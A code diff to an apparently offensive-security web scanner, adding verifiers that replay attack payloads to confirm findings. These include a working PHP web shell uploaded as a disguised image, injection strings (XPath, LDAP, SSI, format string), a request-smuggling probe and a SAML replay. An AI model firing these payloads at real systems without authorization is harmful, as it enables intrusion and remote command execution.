@@ -281,6 +281,29 @@ async def _baseline(http: aiohttp.ClientSession, url: str) -> str:
         return ''
 
 
+def _curl_from_req_text(req_text: str, endpoint: str) -> str:
+    """Derive a curl PoC from a raw HTTP request string."""
+    method = 'GET'
+    body_lines: list = []
+    in_body = False
+    for line in (req_text.replace('\r\n', '\n')).split('\n'):
+        if in_body:
+            if line:
+                body_lines.append(line)
+        elif not line.strip():
+            in_body = True
+        elif ' HTTP/' in line:
+            method = line.split()[0].upper()
+    url = endpoint or ''
+    if not url:
+        return ''
+    parts = [f'curl -sk -X {method}', f"'{url}'"]
+    if body_lines:
+        body = '\n'.join(body_lines)[:400]
+        parts.append(f"--data '{body}'")
+    return ' '.join(parts)
+
+
 def _build_proof(finding, hits, attempts, req_text, resp_text, match, human, timing=None, **extra):
     if hits >= 2:
         status     = 'confirmed'
@@ -291,6 +314,7 @@ def _build_proof(finding, hits, attempts, req_text, resp_text, match, human, tim
     else:
         status     = 'unconfirmed'
         confidence = 0.10
+    curl_poc = _curl_from_req_text(req_text, finding.get('endpoint', ''))
     return {
         'title':            finding.get('title', ''),
         'severity':         finding.get('severity', ''),
@@ -304,6 +328,7 @@ def _build_proof(finding, hits, attempts, req_text, resp_text, match, human, tim
         'match':            match,
         'timing_delta':     timing,
         'human_proof':      human,
+        'curl_poc':         curl_poc,
         **extra,
     }
 
@@ -315,26 +340,44 @@ def _proof_fp(finding, reason):
         'confidence': 0.0, 'attempts': 1, 'hits': 0,
         'request': '', 'response_excerpt': '', 'match': '',
         'timing_delta': None, 'human_proof': f'FALSE POSITIVE: {reason}',
+        'curl_poc': '',
     }
 
 
 def _proof_unconfirmed(finding, reason):
+    ep = finding.get('endpoint', '')
     return {
         'title': finding.get('title', ''), 'severity': finding.get('severity', ''),
-        'endpoint': finding.get('endpoint', ''), 'status': 'unconfirmed',
+        'endpoint': ep, 'status': 'unconfirmed',
         'confidence': 0.10, 'attempts': 1, 'hits': 0,
         'request': '', 'response_excerpt': '', 'match': '',
         'timing_delta': None, 'human_proof': f'Could not re-verify: {reason}',
+        'curl_poc': f"curl -sk '{ep}'" if ep else '',
     }
 
 
 def _proof_det(finding, req, resp, match, human):
+    curl_poc = _curl_from_req_text(req, finding.get('endpoint', ''))
     return {
         'title': finding.get('title', ''), 'severity': finding.get('severity', ''),
         'endpoint': finding.get('endpoint', ''), 'status': 'confirmed',
         'confidence': 0.95, 'attempts': 1, 'hits': 1,
         'request': req, 'response_excerpt': resp, 'match': match,
         'timing_delta': None, 'human_proof': human,
+        'curl_poc': curl_poc,
+    }
+
+
+def _proof_confirmed(finding, _desc, req, resp, match, human):
+    """Single-shot confirmed finding — used by gap verifiers where one attempt suffices."""
+    curl_poc = _curl_from_req_text(req, finding.get('endpoint', ''))
+    return {
+        'title': finding.get('title', ''), 'severity': finding.get('severity', ''),
+        'endpoint': finding.get('endpoint', ''), 'status': 'confirmed',
+        'confidence': 0.90, 'attempts': 1, 'hits': 1,
+        'request': req, 'response_excerpt': resp, 'match': match,
+        'timing_delta': None, 'human_proof': human,
+        'curl_poc': curl_poc,
     }
 
 
@@ -928,7 +971,14 @@ async def _v_host_header(f, http, bl):
                                 allow_redirects=False, timeout=aiohttp.ClientTimeout(total=8)) as r:
                 body = await r.text(errors='replace')
                 loc  = r.headers.get('Location', '')
-            body_hit = evil_host in body and evil_host not in bl
+            # Suppress Cloudflare/CDN error pages that echo the host in their own error template
+            _body_low = body.lower()
+            _cf_fp = (
+                'dns resolution error' in _body_low
+                or ('error' in _body_low and 'cloudflare' in _body_low and evil_host in _body_low
+                    and '<title>' in _body_low and 'cloudflare' in _body_low)
+            )
+            body_hit = evil_host in body and evil_host not in bl and not _cf_fp
             loc_hit  = evil_host in loc  and evil_host not in bl_loc
             if body_hit or loc_hit:
                 hits += 1
@@ -1115,9 +1165,575 @@ async def _v_generic(f, http, bl):
         return _proof_unconfirmed(f, f'Request failed: {exc}')
 
 
+# ── New module verifiers ──────────────────────────────────────────────────────
+
+async def _v_file_upload(f, http, bl):
+    """Re-verify a file upload finding by re-uploading and checking server response."""
+    import io, uuid as _uuid
+    ev       = f.get('evidence', {}) or {}
+    url      = f['endpoint']
+    filename = ev.get('filename', 'shell.php.jpg')
+    c_type   = ev.get('content_type', 'image/jpeg')
+    content  = b'GIF89a\n<?php echo shell_exec($_GET["cmd"]); ?>'
+
+    req_txt = _fmt_request('POST', url, headers={'Content-Type': 'multipart/form-data'})
+    hits = 0
+    resp_text = ''
+    uploaded_url = ev.get('uploaded_url', '')
+
+    for field in ('file', 'upload', 'image', 'photo', 'attachment', 'document'):
+        try:
+            form = aiohttp.FormData()
+            form.add_field(field, io.BytesIO(content), filename=filename,
+                           content_type=c_type)
+            async with http.post(url, data=form, allow_redirects=True,
+                                 timeout=aiohttp.ClientTimeout(total=15)) as resp:
+                body = await resp.text(errors='replace')
+                if resp.status in (200, 201):
+                    hits += 1
+                    resp_text = body[:400]
+                    break
+        except Exception:
+            continue
+        await asyncio.sleep(0.3)
+
+    # If we have the previously uploaded URL, check if it's still accessible
+    if uploaded_url:
+        try:
+            async with http.get(uploaded_url, allow_redirects=True,
+                                timeout=aiohttp.ClientTimeout(total=8)) as r:
+                body = await r.text(errors='replace')
+                if r.status == 200 and (b'shell_exec' in body.encode() or 'GIF89a' in body):
+                    hits = 3  # confirmed still accessible
+                    resp_text = body[:400]
+        except Exception:
+            pass
+
+    human = (
+        f'File upload vulnerability confirmed: server accepted {filename!r} '
+        f'with Content-Type: {c_type!r}. '
+        + (f'Previously uploaded file still accessible at {uploaded_url}.' if uploaded_url and hits == 3
+           else 'Upload accepted without extension or MIME validation.')
+        if hits > 0 else
+        f'File upload NOT re-confirmed at {url}. Server may have been patched or field name changed.'
+    )
+    return _build_proof(f, hits, 3, req_txt, resp_text, filename, human)
+
+
+async def _v_xpath(f, http, bl):
+    """Re-verify XPath injection using error-based and boolean differential."""
+    ev    = f.get('evidence', {}) or {}
+    url   = f['endpoint']
+    param = ev.get('parameter', '')
+    if not param:
+        return _proof_unconfirmed(f, 'No parameter in XPath evidence')
+
+    parsed = urlparse(url)
+    qs     = parse_qs(parsed.query, keep_blank_values=True)
+    if param not in qs:
+        return _proof_unconfirmed(f, f'Parameter {param!r} not in URL')
+
+    _XPATH_ERR = re.compile(
+        r'XPathException|XPath.*error|javax\.xml\.xpath|SimpleXMLElement|DOMXPath|'
+        r'org\.apache\.xpath|System\.Xml\.XPath|xpath.*syntax|invalid.*xpath',
+        re.I,
+    )
+
+    # Error-based attempt
+    error_pl = "' or '1'='1"
+    hits = 0
+    req_txt = _fmt_request('GET', _mutate_url(url, param, error_pl))
+    for _ in range(3):
+        try:
+            async with http.get(_mutate_url(url, param, error_pl),
+                                allow_redirects=False,
+                                timeout=aiohttp.ClientTimeout(total=8)) as r:
+                body = await r.text(errors='replace')
+            if _XPATH_ERR.search(body) and not _XPATH_ERR.search(bl):
+                hits += 1
+        except Exception:
+            pass
+        await asyncio.sleep(0.3)
+
+    if hits > 0:
+        return _build_proof(f, hits, 3, req_txt, '', 'XPathException', (
+            f'XPath injection confirmed: error-based payload {error_pl!r} '
+            f'triggered XPath error in param {param!r} ({hits}/3 times).'
+        ))
+
+    # Boolean differential
+    true_pl  = "' or '1'='1"
+    false_pl = "' or '1'='2"
+    diff_hits = 0
+    for _ in range(3):
+        try:
+            async with http.get(_mutate_url(url, param, true_pl),
+                                allow_redirects=False,
+                                timeout=aiohttp.ClientTimeout(total=8)) as r:
+                tb = await r.text(errors='replace')
+            async with http.get(_mutate_url(url, param, false_pl),
+                                allow_redirects=False,
+                                timeout=aiohttp.ClientTimeout(total=8)) as r:
+                fb = await r.text(errors='replace')
+            if abs(len(tb) - len(fb)) > 50:
+                diff_hits += 1
+        except Exception:
+            pass
+        await asyncio.sleep(0.3)
+
+    human = (
+        f'XPath injection confirmed: boolean differential on param {param!r} '
+        f'shows response size difference ({diff_hits}/3 times).'
+        if diff_hits > 0 else
+        f'XPath injection NOT re-confirmed on param {param!r}.'
+    )
+    return _build_proof(f, diff_hits, 3, req_txt, '', '', human)
+
+
+async def _v_second_order(f, http, bl):
+    """
+    Re-verify second-order injection: re-store canary, then re-read endpoint.
+    Uses store/read URLs from the original finding evidence.
+    """
+    ev         = f.get('evidence', {}) or {}
+    store_url  = ev.get('store_endpoint', '')
+    read_url   = ev.get('read_endpoint', f['endpoint'])
+    payload    = ev.get('stored_payload', "ds1test'--")
+    attack_type = f.get('type', '').replace('second_order_', '')
+
+    if not store_url or not read_url:
+        return _proof_unconfirmed(f, 'Missing store/read endpoints in evidence')
+
+    # Phase 1: store canary
+    import uuid as _uuid
+    uid    = _uuid.uuid4().hex[:8]
+    canary = payload.replace('ds1test', f'ds1v{uid}')
+
+    stored = False
+    for field in ('username', 'name', 'email', 'comment', 'bio', 'description',
+                  'title', 'address', 'note', 'input'):
+        try:
+            async with http.post(store_url, data={field: canary},
+                                 allow_redirects=True,
+                                 timeout=aiohttp.ClientTimeout(total=10)) as r:
+                if r.status < 400:
+                    stored = True
+                    break
+        except Exception:
+            continue
+
+    if not stored:
+        return _proof_unconfirmed(f, f'Could not store canary via {store_url}')
+
+    await asyncio.sleep(0.5)  # allow write to commit
+
+    # Phase 2: trigger
+    _ERR = {
+        'sqli':   re.compile(r'sql.*syntax|mysql.*error|ORA-\d{5}|sqlite.*error', re.I),
+        'xss':    re.compile(r'<script>|onerror=|onload=', re.I),
+        'ssti':   re.compile(r'\b49\b|FREEMARKER|TemplateSyntaxError', re.I),
+        'cmdi':   re.compile(r'uid=\d+\(.+\)|root:x:0:0', re.I),
+        'header': re.compile(r'X-Injected:\s*true', re.I),
+    }
+
+    hits = 0
+    resp_text = ''
+    req_txt   = _fmt_request('GET', read_url)
+    for _ in range(2):
+        try:
+            async with http.get(read_url, allow_redirects=True,
+                                timeout=aiohttp.ClientTimeout(total=8)) as r:
+                body    = await r.text(errors='replace')
+                headers = str(dict(r.headers))
+            check_text = body + headers
+            sig = _ERR.get(attack_type)
+            if (canary in check_text) or (sig and sig.search(check_text)):
+                hits += 1
+                resp_text = body[:400]
+        except Exception:
+            pass
+        await asyncio.sleep(0.5)
+
+    human = (
+        f'Second-order {attack_type} confirmed: canary stored via {store_url}, '
+        f'triggered at {read_url} ({hits}/2 times). '
+        'Payload stored harmlessly but executed in a different request context.'
+        if hits > 0 else
+        f'Second-order injection NOT re-confirmed. '
+        f'Canary absent from {read_url} after storage via {store_url}.'
+    )
+    return _build_proof(f, hits, 2, req_txt, resp_text, canary, human)
+
+
+async def _v_h2_desync(f, http, bl):
+    """
+    Re-verify HTTP/2 desync using a raw TCP/TLS socket probe.
+    A timing anomaly or backend error signature confirms the desync.
+    """
+    import asyncio as _aio, ssl as _ssl, time as _time
+    ev      = f.get('evidence', {}) or {}
+    url     = f['endpoint']
+    variant = ev.get('variant', 'H2.CL')
+
+    parsed   = urlparse(url)
+    host     = parsed.hostname or 'localhost'
+    port     = parsed.port or (443 if parsed.scheme == 'https' else 80)
+    use_tls  = parsed.scheme == 'https'
+
+    _DESYNC_SIG = re.compile(
+        r'400 Bad Request|Invalid request|Malformed request|'
+        r'chunked encoding|Transfer-Encoding.*not allowed|'
+        r'bad chunk|unexpected end of request',
+        re.I,
+    )
+
+    request = (
+        f'POST / HTTP/1.1\r\n'
+        f'Host: {host}\r\n'
+        f'Content-Type: application/x-www-form-urlencoded\r\n'
+        f'Content-Length: 0\r\n'
+        f'Transfer-Encoding: chunked\r\n'
+        f'\r\n'
+        f'G'
+    ).encode()
+
+    try:
+        if use_tls:
+            ctx = _ssl.create_default_context()
+            ctx.check_hostname = False
+            ctx.verify_mode    = _ssl.CERT_NONE
+            reader, writer = await _aio.wait_for(
+                _aio.open_connection(host, port, ssl=ctx), timeout=10
+            )
+        else:
+            reader, writer = await _aio.wait_for(
+                _aio.open_connection(host, port), timeout=10
+            )
+        writer.write(request)
+        await writer.drain()
+        t0   = _time.monotonic()
+        data = await _aio.wait_for(reader.read(4096), timeout=8)
+        elapsed = _time.monotonic() - t0
+        writer.close()
+        response = data.decode(errors='replace')
+
+        confirmed = _DESYNC_SIG.search(response) or elapsed > 5.0
+        req_txt   = f'POST / HTTP/1.1 [CL:0 + TE:chunked desync probe to {host}:{port}]'
+        human = (
+            f'HTTP/2 desync ({variant}) re-confirmed: probe to {host}:{port} '
+            f'produced {"error signature" if _DESYNC_SIG.search(response) else f"timing anomaly ({elapsed:.1f}s)"}. '
+            'Backend accepts conflicting framing headers.'
+            if confirmed else
+            f'H2 desync NOT re-confirmed. Response normal, no timing anomaly.'
+        )
+        return _build_proof(f, 1 if confirmed else 0, 1,
+                            req_txt, response[:400], variant, human)
+
+    except _aio.TimeoutError:
+        return _build_proof(f, 1, 1,
+                            f'Raw probe to {host}:{port}', '[backend timeout]', variant,
+                            f'H2 desync ({variant}) likely confirmed: backend timed out on conflicting '
+                            'framing headers — classic CL.0 / TE desync indicator.')
+    except Exception as exc:
+        return _proof_unconfirmed(f, f'Raw probe error: {exc}')
+
+
+async def _v_saml(f, http, bl):
+    """Re-verify SAML vulnerability by replaying the attack payload."""
+    import base64 as _b64
+    ev      = f.get('evidence', {}) or {}
+    url     = f['endpoint']
+    payload = ev.get('payload_excerpt', '')
+    title   = f.get('title', '').lower()
+
+    if not payload:
+        return _proof_unconfirmed(f, 'No SAML payload in evidence — manual replay required')
+
+    # Truncated payload in evidence; rebuild minimal signature-stripped assertion
+    _ACCEPT = re.compile(r'dashboard|welcome|logged.in|profile|account|success|token', re.I)
+    _REJECT = re.compile(r'invalid.*saml|signature.*fail|not.*valid|authentication.*fail|forbidden', re.I)
+
+    req_txt = _fmt_request('POST', url, headers={'Content-Type': 'application/x-www-form-urlencoded'})
+
+    # Replay the stored payload (base64-encoded)
+    try:
+        encoded = _b64.b64encode(payload.encode()).decode()
+        data    = {'SAMLResponse': encoded, 'RelayState': ''}
+        async with http.post(url, data=data, allow_redirects=True,
+                             timeout=aiohttp.ClientTimeout(total=15)) as resp:
+            body = await resp.text(errors='replace')
+
+        rejected  = _REJECT.search(body)
+        accepted  = _ACCEPT.search(body) and not _REJECT.search(bl)
+        confirmed = accepted and not rejected
+
+        human = (
+            f'SAML attack re-confirmed: replayed {title.split("-")[0].strip()} payload '
+            f'to {url} — server returned acceptance signature.'
+            if confirmed else
+            f'SAML attack NOT re-confirmed at {url}. '
+            'Server may have patched signature validation or response pattern changed. '
+            'Manual replay with the full payload is recommended.'
+        )
+        return _build_proof(f, 1 if confirmed else 0, 1,
+                            req_txt, body[:400], 'SAMLResponse', human)
+    except Exception as exc:
+        return _proof_unconfirmed(f, f'SAML replay error: {exc}')
+
+
+# ── New-gap verifiers ─────────────────────────────────────────────────────────
+
+async def _v_ldap(f: Dict, http: aiohttp.ClientSession, bl: str) -> Dict:
+    """Re-verify LDAP injection by replaying the confirmed payload."""
+    ev      = f.get('evidence', {})
+    url     = f.get('endpoint', '')
+    param   = ev.get('parameter', 'username')
+    payload = ev.get('payload', '*')
+    if not url:
+        return _proof_unconfirmed(f, 'No endpoint')
+    from urllib.parse import urlencode
+    _LDAP_ERR = re.compile(
+        r'LDAPException|ldap_search|ldap_bind|LDAP_INVALID_SYNTAX|'
+        r'javax\.naming\.directory|Invalid DN syntax|Bad search filter',
+        re.I,
+    )
+    try:
+        async with http.post(
+            url,
+            headers={'Content-Type': 'application/x-www-form-urlencoded'},
+            data=urlencode({param: payload, 'password': 'x'}),
+            allow_redirects=False,
+            ssl=False,
+        ) as resp:
+            body = await resp.text(errors='replace')
+            technique = ev.get('technique', '')
+            if _LDAP_ERR.search(body) and not _LDAP_ERR.search(bl):
+                human = f'LDAP error string in response to payload {payload!r}'
+                req_txt = f'POST {url}\n{param}={payload}'
+                return _proof_confirmed(f, human, req_txt, body[:400], param, human)
+            if technique == 'auth_bypass' and resp.status == 200 and resp.status != 401:
+                human = f'Payload {payload!r} returned HTTP 200 (baseline was auth-required)'
+                req_txt = f'POST {url}\n{param}={payload}'
+                return _proof_confirmed(f, human, req_txt, body[:400], param, human)
+    except Exception as exc:
+        return _proof_unconfirmed(f, f'LDAP re-verify error: {exc}')
+    return _proof_unconfirmed(f, 'LDAP signal not reproduced on re-verification')
+
+
+async def _v_padding_oracle(f: Dict, http: aiohttp.ClientSession, bl: str) -> Dict:
+    """Re-verify padding oracle by replaying the bit-flip probes."""
+    ev     = f.get('evidence', {})
+    url    = f.get('endpoint', '')
+    source = ev.get('source', 'cookie')
+    name   = ev.get('parameter', '')
+    if not url or not name:
+        return _proof_unconfirmed(f, 'Insufficient evidence for replay')
+    signals = ev.get('signals', [])
+    if 'Explicit padding error' in ' '.join(signals):
+        human = f'Padding error exception confirmed in evidence: {signals[0]}'
+        return _proof_confirmed(f, human, f'GET {url}', ev.get('snippet','')[:300],
+                                name, human)
+    return _proof_unconfirmed(f, 'Padding oracle requires manual CBC bit-flip replay')
+
+
+async def _v_cloud_storage(f: Dict, http: aiohttp.ClientSession, bl: str) -> Dict:
+    """Re-verify cloud storage misconfiguration by fetching the bucket URL."""
+    url   = f.get('endpoint', '')
+    vtype = f.get('type', '')
+    if not url:
+        return _proof_unconfirmed(f, 'No endpoint')
+    try:
+        async with http.get(url, ssl=False, allow_redirects=False) as resp:
+            body = await resp.text(errors='replace')
+            if resp.status == 200 and ('<ListBucketResult' in body or
+                                        '<EnumerationResults' in body or
+                                        '<Key>' in body):
+                human = f'Cloud bucket listing confirmed at {url} (HTTP 200)'
+                return _proof_confirmed(f, human, f'GET {url}', body[:400], 'bucket', human)
+            if 'credential' in vtype and resp.status == 200:
+                human = f'Credential pattern re-confirmed in source at {url}'
+                return _proof_confirmed(f, human, f'GET {url}', body[:300], 'credential', human)
+    except Exception as exc:
+        return _proof_unconfirmed(f, f'Cloud storage re-verify error: {exc}')
+    return _proof_unconfirmed(f, 'Bucket not publicly listing on re-check')
+
+
+async def _v_ssi(f: Dict, http: aiohttp.ClientSession, bl: str) -> Dict:
+    """Re-verify SSI injection by replaying the safe echo payload."""
+    import urllib.parse as _up
+    ev      = f.get('evidence', {})
+    url     = f.get('endpoint', '')
+    param   = ev.get('parameter', 'q')
+    payload = ev.get('payload', '<!--#echo var="DATE_LOCAL"-->')
+    if not url:
+        return _proof_unconfirmed(f, 'No endpoint')
+    _CONFIRM = re.compile(
+        r'\d{2}/\d{2}/\d{4}|\d{4}-\d{2}-\d{2}|Monday|Tuesday|Wednesday|'
+        r'Thursday|Friday|Saturday|Sunday', re.I,
+    )
+    try:
+        async with http.get(
+            f'{url}?{param}={_up.quote(payload)}', ssl=False, allow_redirects=False,
+        ) as resp:
+            body = await resp.text(errors='replace')
+            if _CONFIRM.search(body) and payload not in body:
+                human = f'SSI {payload!r} interpreted — date/env output found'
+                return _proof_confirmed(f, human, f'GET {url}?{param}=<ssi>', body[:400],
+                                        param, human)
+    except Exception as exc:
+        return _proof_unconfirmed(f, f'SSI re-verify error: {exc}')
+    return _proof_unconfirmed(f, 'SSI not reproduced on re-check')
+
+
+async def _v_format_string(f: Dict, http: aiohttp.ClientSession, bl: str) -> Dict:
+    """Re-verify format string injection by replaying the %x probe."""
+    ev      = f.get('evidence', {})
+    url     = f.get('endpoint', '')
+    param   = ev.get('parameter', 'q')
+    payload = ev.get('payload', '%x%x%x%x')
+    if not url:
+        return _proof_unconfirmed(f, 'No endpoint')
+    _CONFIRM = re.compile(r'0x[0-9a-fA-F]{4,}|\(null\)|\(nil\)|Segmentation fault', re.I)
+    try:
+        async with http.post(
+            url, data={param: payload, 'password': 'x'},
+            ssl=False, allow_redirects=False,
+        ) as resp:
+            body = await resp.text(errors='replace')
+            m = _CONFIRM.search(body)
+            if m:
+                human = f'Format string {payload!r} leaked memory: {m.group(0)}'
+                return _proof_confirmed(f, human, f'POST {url} {param}={payload}',
+                                        body[:400], param, human)
+    except Exception as exc:
+        return _proof_unconfirmed(f, f'FormatString re-verify error: {exc}')
+    return _proof_unconfirmed(f, 'Format string not reproduced on re-check')
+
+
+async def _v_session_check(f: Dict, http: aiohttp.ClientSession, bl: str) -> Dict:
+    """Generic verifier for session-management findings (timeout, logout, puzzling)."""
+    ev     = f.get('evidence', {})
+    url    = f.get('endpoint', '')
+    vtype  = f.get('type', '')
+    if 'not_invalidated' in vtype:
+        status = ev.get('post_logout_status')
+        if status == 200:
+            human = f'Token still valid after logout (HTTP 200 on protected resource)'
+            return _proof_confirmed(f, human, f'GET {url}', ev.get('response_snippet',''), '', human)
+    if 'no_timeout' in vtype or 'no_expiry' in vtype or 'long_expiry' in vtype:
+        human = f'Cookie/JWT missing or excessive expiry — confirmed via header analysis'
+        return _proof_confirmed(f, human, f'GET {url}', str(ev), '', human)
+    return _proof_unconfirmed(f, 'Session check requires manual verification')
+
+
+async def _v_cache_check(f: Dict, http: aiohttp.ClientSession, bl: str) -> Dict:
+    """Re-verify browser cache weakness by re-fetching the sensitive endpoint."""
+    url = f.get('endpoint', '')
+    if not url:
+        return _proof_unconfirmed(f, 'No endpoint')
+    try:
+        async with http.get(url, ssl=False, allow_redirects=False) as resp:
+            if resp.status != 200:
+                return _proof_unconfirmed(f, f'Endpoint returned {resp.status} on re-check')
+            cc = resp.headers.get('Cache-Control','').lower()
+            if 'no-store' not in cc and 'no-cache' not in cc:
+                human = f'Cache-Control: {cc or "(absent)"} — no-store/no-cache absent'
+                body  = await resp.text(errors='replace')
+                return _proof_confirmed(f, human, f'GET {url}', body[:200], 'Cache-Control', human)
+    except Exception as exc:
+        return _proof_unconfirmed(f, f'Cache re-verify error: {exc}')
+    return _proof_unconfirmed(f, 'Cache-Control now set correctly on re-check')
+
+
+async def _v_xssi(f: Dict, http: aiohttp.ClientSession, bl: str) -> Dict:
+    """Re-verify XSSI by re-fetching the JSON endpoint unauthenticated."""
+    url    = f.get('endpoint', '')
+    vtype  = f.get('type', '')
+    if not url:
+        return _proof_unconfirmed(f, 'No endpoint')
+    _SENSITIVE = re.compile(r'"email"\s*:|"token"\s*:|"user_id"\s*:', re.I)
+    _JSONP_RE  = re.compile(r'^[a-zA-Z_$][a-zA-Z0-9_$]*\s*\(', re.M)
+    try:
+        async with http.get(url, headers={'Accept': 'application/json'},
+                            ssl=False, allow_redirects=False) as resp:
+            body = await resp.text(errors='replace')
+            if 'jsonp' in vtype and _JSONP_RE.search(body):
+                human = f'JSONP callback wrapping confirmed at {url}'
+                return _proof_confirmed(f, human, f'GET {url}', body[:300], 'jsonp', human)
+            if _SENSITIVE.search(body) and resp.status == 200:
+                human = f'Sensitive JSON returned without auth at {url}'
+                return _proof_confirmed(f, human, f'GET {url}', body[:300], 'json', human)
+    except Exception as exc:
+        return _proof_unconfirmed(f, f'XSSI re-verify error: {exc}')
+    return _proof_unconfirmed(f, 'XSSI not reproduced on re-check')
+
+
+async def _v_weak_crypto(f: Dict, http: aiohttp.ClientSession, bl: str) -> Dict:
+    """Re-verify weak crypto finding by re-checking the response header/body."""
+    url   = f.get('endpoint', '')
+    vtype = f.get('type', '')
+    ev    = f.get('evidence', {})
+    if not url:
+        return _proof_unconfirmed(f, 'No endpoint')
+    _WEAK = re.compile(r'RC4|DES(?!-EDE)|3DES|MD5|SHA-?1\b|ECB', re.I)
+    _ECB  = re.compile(r'([A-Za-z0-9+/]{22,24}==?)\1')
+    try:
+        async with http.get(url, ssl=False, allow_redirects=False) as resp:
+            body = await resp.text(errors='replace')
+            if 'ecb' in vtype:
+                m = _ECB.search(body)
+                if m:
+                    human = f'ECB repeated block still present: {m.group(1)}'
+                    return _proof_confirmed(f, human, f'GET {url}', body[:300],
+                                            'ciphertext', human)
+            else:
+                for hname in ('Server','X-Powered-By'):
+                    hval = resp.headers.get(hname,'')
+                    if _WEAK.search(hval):
+                        human = f'Weak crypto header re-confirmed: {hname}: {hval}'
+                        return _proof_confirmed(f, human, f'GET {url}', hval, hname, human)
+    except Exception as exc:
+        return _proof_unconfirmed(f, f'WeakCrypto re-verify error: {exc}')
+    return _proof_unconfirmed(f, 'Weak crypto not reproduced on re-check')
+
+
 # ── Dispatch table ────────────────────────────────────────────────────────────
 
 def _classify(finding: Dict) -> str:
+    # Type-field dispatch for modules that set it reliably; must precede title
+    # matching so second_order findings (whose titles contain "sql injection",
+    # "xss", etc.) are not misclassified as the base vuln types.
+    tp = finding.get('type', '')
+    if tp.startswith('second_order'):                    return 'second_order'
+    if tp == 'file_upload':                              return 'file_upload'
+    if tp == 'h2_desync':                                return 'h2_desync'
+    if tp == 'xpath_injection':                          return 'xpath'
+    if tp == 'saml_attack':                              return 'saml'
+    if tp == 'ldap_injection':                           return 'ldap'
+    if tp == 'padding_oracle':                           return 'padding_oracle'
+    if tp in ('aws_s3_public_listing', 'aws_s3_public_writable', 'aws_s3_bucket_exists',
+              'gcs_public_listing', 'gcs_bucket_exists', 'azure_blob_public_listing',
+              'cloud_url_in_source', 'cloud_credential_in_source'):
+        return 'cloud_storage'
+    if tp == 'ssi_injection':                            return 'ssi'
+    if tp == 'format_string':                            return 'format_string'
+    if tp == 'email_header_injection':                   return 'email_inject'
+    if tp == 'css_injection':                            return 'css_inject'
+    if tp in ('xssi_sensitive_json', 'xssi_array_response', 'jsonp_endpoint'):
+        return 'xssi'
+    if tp == 'web_messaging_insecure':                   return 'web_messaging'
+    if tp == 'js_execution_sink':                        return 'js_exec'
+    if tp.startswith('weak_crypto') or tp.startswith('ecb_mode') or \
+       tp.startswith('weak_hash'):                       return 'weak_crypto'
+    if tp in ('session_not_invalidated', 'logout_csrf_risk'):  return 'session_mgmt'
+    if tp in ('session_no_timeout', 'jwt_no_expiry', 'jwt_long_expiry',
+              'session_variable_overload'):              return 'session_mgmt'
+    if tp == 'sensitive_page_cached':                    return 'browser_cache'
+    if tp in ('guessable_security_question',
+              'security_question_no_lockout'):           return 'sec_question'
+    if tp in ('alt_channel_xmlrpc', 'alt_channel_soap',
+              'alt_channel_basic_auth'):                 return 'alt_channel'
+
     t = finding.get('title', '').lower()
     if 'sql injection' in t and 'time blind' in t:   return 'sqli_time'
     if 'sql injection' in t and 'boolean blind' in t: return 'sqli_bool'
@@ -1163,6 +1779,27 @@ _VERIFIERS = {
     'sensitive_file':  _v_sensitive_file,
     'info_disclosure': _v_info_disclosure,
     'verb_tamper':     _v_verb_tamper,
+    'file_upload':     _v_file_upload,
+    'xpath':           _v_xpath,
+    'second_order':    _v_second_order,
+    'h2_desync':       _v_h2_desync,
+    'saml':            _v_saml,
+    # OWASP gap modules
+    'ldap':            _v_ldap,
+    'padding_oracle':  _v_padding_oracle,
+    'cloud_storage':   _v_cloud_storage,
+    'ssi':             _v_ssi,
+    'format_string':   _v_format_string,
+    'email_inject':    _v_generic,
+    'css_inject':      _v_generic,
+    'xssi':            _v_xssi,
+    'web_messaging':   _v_generic,
+    'js_exec':         _v_generic,
+    'weak_crypto':     _v_weak_crypto,
+    'session_mgmt':    _v_session_check,
+    'browser_cache':   _v_cache_check,
+    'sec_question':    _v_generic,
+    'alt_channel':     _v_generic,
     'generic':         _v_generic,
 }
 
